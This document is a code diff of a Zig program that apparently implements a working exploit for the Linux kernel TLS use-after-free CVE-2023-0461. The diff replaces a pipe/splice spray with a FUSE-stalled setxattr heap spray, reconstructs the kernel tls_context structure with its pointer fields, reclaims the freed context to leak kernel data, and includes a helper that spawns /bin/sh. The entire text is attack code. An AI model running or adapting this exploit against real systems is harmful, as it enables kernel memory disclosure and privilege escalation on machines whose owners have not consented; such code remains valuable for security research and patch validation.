@@ -10,6 +10,8 @@ const E = l.E;
 const mem = std.mem;
 const Allocator = mem.Allocator;
 
+const Fuse = @import("fuse.zig");
+
 const SOL = struct {
     pub const TCP = 6;
 };
@@ -24,10 +26,12 @@ const F = struct {
 };
 
 const CipherType = enum(u16) {
+    Zero = 0x0,
     AESGCM128 = 51,
 };
 
 const Version = enum(u16) {
+    Zero = 0x0,
     TLS12 = 0x0303,
     TLS13 = 0x0304,
 };
@@ -66,15 +70,69 @@ comptime {
     assert(@sizeOf(TLSProtInfo) == 20);
 }
 
+const KernelPtr = usize;
+
+const CipherContext = extern struct {
+    iv: KernelPtr,
+    rec_seq: KernelPtr,
+};
+
+const ListHead = extern struct {
+    next: KernelPtr,
+    prev: KernelPtr,
+};
+
+const CallbackHead = extern struct {
+    next: KernelPtr,
+    func: KernelPtr,
+};
+
 const TLSContext = extern struct {
     prot_info: TLSProtInfo,
+    flags_below: u8,
+    // tx_conf: u3,
+    // rx_conf: u3,
+    // zerocopy_sendfile: bool,
+    // rx_no_pad: bool,
+    hole0: [3]u8,
+    push_pending_record: KernelPtr,
+    sk_write_space: KernelPtr,
+    priv_ctx_tx: KernelPtr,
+    priv_ctx_rx: KernelPtr,
+    netdev: KernelPtr,
+    tx: CipherContext,
+    rx: CipherContext,
+    partially_sent_record: KernelPtr,
+    partially_sent_offset: u16,
+    in_tcp_sendpages: u8,
+    pending_open_record_frags: u8,
+    hole1: [4]u8,
+    tx_lock: [32]u8,
+    flags: u64,
+    sk_proto: KernelPtr,
+    sk: KernelPtr,
+    sk_destruct: KernelPtr,
+    crypto_send_aes_gcm_128: AESGCM128,
+    unused_from_send_union: [16]u8,
+    crypto_recv_aes_gcm_128: AESGCM128,
+    unused_from_recv_union: [16]u8,
+    list: ListHead,
+    refcount: u32,
+    hole2: [4]u8,
+    rcu: CallbackHead,
 };
+
+comptime {
+    assert(@sizeOf(TLSContext) == 328);
+}
 
 // Zig std library doesn't consider possiblity of setting iov_base to null
 const iovec_const = extern struct {
     iov_base: [*c]const u8,
     iov_len: usize,
 };
+
+const allc = std.heap.page_allocator;
 
 pub fn writev(fd: os.fd_t, iov: []const iovec_const) os.WriteError!usize {
     const iov_count = @as(u31, @intCast(iov.len));
@@ -185,10 +243,24 @@ const SyncPipe = struct {
     pub fn cont(self: Self, on: u8) !void {
         _ = try os.write(self.pipe[1], &.{on});
     }
+
+    pub fn retry(self: Self, on: u8) !bool {
+        var buf = [_]u8{0x00};
+        _ = try os.read(self.pipe[0], &buf);
+
+        if (buf[0] == 0)
+            return true;
+
+        if (buf[0] != on) {
+            log.err("desync: {} != {}", .{ buf[0], on });
+            return error.desync;
+        }
+
+        return false;
+    }
 };
 
 fn sh() !void {
-    const allc = std.heap.page_allocator;
     var child = std.process.Child.init(&[_][]const u8{"/bin/sh"}, allc);
 
     _ = try child.spawnAndWait();
@@ -202,16 +274,18 @@ fn cve_2023_0461() !void {
     const unspec_addr = l.sockaddr{ .family = l.AF.UNSPEC, .data = undefined };
     const addr_sz = @sizeOf(@TypeOf(server_addr.sa));
 
-    const dst_file = try fs.createFileAbsolute("/tmp/dst_file", .{
-        .truncate = true,
-    });
+    var env = try std.process.getEnvMap(allc);
+    defer env.deinit();
+    var fuse_dir = try Fuse.mkTmpDir("fuse-cve-2023-0461", env);
+    defer fuse_dir.close();
+    var fuse = try Fuse.init(fuse_dir);
+    defer fuse.deinit();
+    const ops = Fuse.Ops{};
 
-    const src_pipe = try os.pipe();
-    _ = try os.fcntl(src_pipe[0], F.SETPIPE_SZ, mem.page_size * 17);
-    _ = try os.fcntl(src_pipe[1], F.SETPIPE_SZ, mem.page_size * 17);
-
-    const sync = try SyncPipe.init();
-    defer sync.deinit();
+    const psync = try SyncPipe.init();
+    defer psync.deinit();
+    const csync = try SyncPipe.init();
+    defer csync.deinit();
 
     const target_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
     defer os.closeSocket(target_sk);
@@ -225,7 +299,7 @@ fn cve_2023_0461() !void {
 
         try os.bind(server_sk, server_addr_p, addr_sz);
         try os.listen(server_sk, 1);
-        try sync.cont(0);
+        try psync.cont(0);
 
         const client_sk0 = try os.accept(server_sk, null, null, 0);
 
@@ -233,34 +307,52 @@ fn cve_2023_0461() !void {
         try os.setsockopt(client_sk0, SOL.TCP, l.TCP.ULP, "tls");
         try setTLSOpt(client_sk0, .RX);
         defer os.closeSocket(client_sk0);
-        try sync.cont(1);
+        try psync.cont(1);
 
         log.info("child: connect for second connection", .{});
         const client_sk1 = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
         defer os.closeSocket(client_sk1);
-        try sync.wait(2);
+        try csync.wait(2);
         try retry_connect(client_sk1, target_addr_p, addr_sz);
 
-        log.info("child: wait for parent to enter splice", .{});
-        try sync.wait(3);
+        log.info("child: wait for parent to enter setxattr", .{});
+        var got = false;
 
-        log.info("child: try overwrite iovec", .{});
-        setTLSOpt(target_sk, .RX) catch |e| {
-            log.err("child: setTLSOpt failed: {}", .{e});
-        };
+        while (!got) {
+            var req = try fuse.start_read_req();
+            try fuse.do_one(ops); //GETATTR
+            try fuse.do_one(ops); //LOOKUP
 
-        log.info("child: read victim data", .{});
-        {
-            var buf = [_]u8{0x42} ** ((4096 * 3) + 512);
-            const len = try dst_file.read(&buf);
+            log.info("child: try overwrite xattr", .{});
+            setTLSOpt(target_sk, .RX) catch |e| {
+                log.err("child: setTLSOpt failed: {}", .{e});
+            };
 
-            log.info("child: read {}: {s}", .{
-                len,
-                std.fmt.fmtSliceEscapeLower(buf[@min(len, 3 * 4096)..len]),
-            });
+            log.info("child: read victim data", .{});
+
+            req = try fuse.start_read_req();
+
+            switch (req.body) {
+                .setxattr => |xattr| {
+                    log.info("child: read {s}: {}: {s}", .{
+                        xattr.name,
+                        xattr.value.len,
+                        std.fmt.fmtSliceEscapeLower(xattr.value),
+                    });
+                    const ctx: TLSContext = mem.bytesAsValue(TLSContext, xattr.value[0..328]);
+                    log.info("child: read: {}", .{ctx});
+
+                    got = ctx.crypto_recv_aes_gcm_128.iv[0] == 'i';
+                },
+                else => unreachable,
+            }
+
+            fuse.done_read_req(req);
+
+            try fuse.do_one(ops); // SETATTR
         }
 
-        try sync.cont(4);
+        try psync.cont(4);
 
         return;
     }
@@ -268,11 +360,11 @@ fn cve_2023_0461() !void {
     defer _ = os.waitpid(child_pid, 0);
     log.info("parent: connect for first connection", .{});
 
-    try sync.wait(0);
+    try psync.wait(0);
     try retry_connect(target_sk, server_addr_p, addr_sz);
     try os.setsockopt(target_sk, SOL.TCP, l.TCP.ULP, "tls");
 
-    try sync.wait(1);
+    try psync.wait(1);
     log.info("parent: disconnect", .{});
     try os.connect(target_sk, &unspec_addr, @sizeOf(@TypeOf(unspec_addr)));
     try os.bind(target_sk, target_addr_p, addr_sz);
@@ -280,55 +372,30 @@ fn cve_2023_0461() !void {
     log.info("parent: listen for second connection", .{});
 
     try os.listen(target_sk, 1);
-    try sync.cont(2);
+    try csync.cont(2);
 
     const client_sk = try os.accept(target_sk, null, null, 0);
     log.info("parent: free the context", .{});
     os.closeSocket(client_sk);
 
-    log.info("parent: fill the src pipe while we wait", .{});
-    const blocker: [4096 * 3]u8 = .{0x00} ** (4096 * 3);
-    const tls_sw_ctx_rx: [4096]u8 = .{0x00} ** 4096;
-    const to_write = blocker.len + tls_sw_ctx_rx.len;
-    const iov = [2]iovec_const{
-        .{
-            .iov_base = &blocker,
-            .iov_len = blocker.len,
-        },
-        .{
-            .iov_base = &tls_sw_ctx_rx,
-            .iov_len = tls_sw_ctx_rx.len,
-        },
-    };
-
-    {
-        const len = try writev(src_pipe[1], &iov);
-        if (len != to_write) {
-            log.err("parent: writev {} != {}", .{
-                len,
-                to_write,
-            });
-            return error.srcPipeNotFilled;
-        }
-    }
+    const tls_sw_ctx_rx: [512]u8 = .{0x00} ** 512;
 
     log.info("parent: wait for deferred free", .{});
-    os.nanosleep(6, 0);
-    try sync.cont(3);
 
-    {
-        const len = try splice(src_pipe[0], null, dst_file.handle, null, to_write, 0);
+    const name: [:0]const u8 = "user.bar";
+    var tmp_dir = try Fuse.getTmpDir(env);
+    defer tmp_dir.close();
+    const xattr_path: [:0]const u8 = "/tmp/fuse-cve-2023-0461/foo";
 
-        if (len != to_write) {
-            log.err("parent: splice {} != {}", .{
-                len,
-                to_write,
-            });
-            return error.srcPipeNotDrained;
-        }
+    os.nanosleep(5, 0);
+
+    while (psync.retry(4)) {
+        const res = Fuse.setxattr(@ptrCast(xattr_path), name, &tls_sw_ctx_rx, tls_sw_ctx_rx.len, 0);
+        const err = os.errno(res);
+        log.info("parent: setxattr: {s}: {s}: {}", .{ xattr_path, name, err });
     }
 
-    try sync.wait(4);
+    try psync.wait(5);
 
     log.info("Goodbye!", .{});
 }
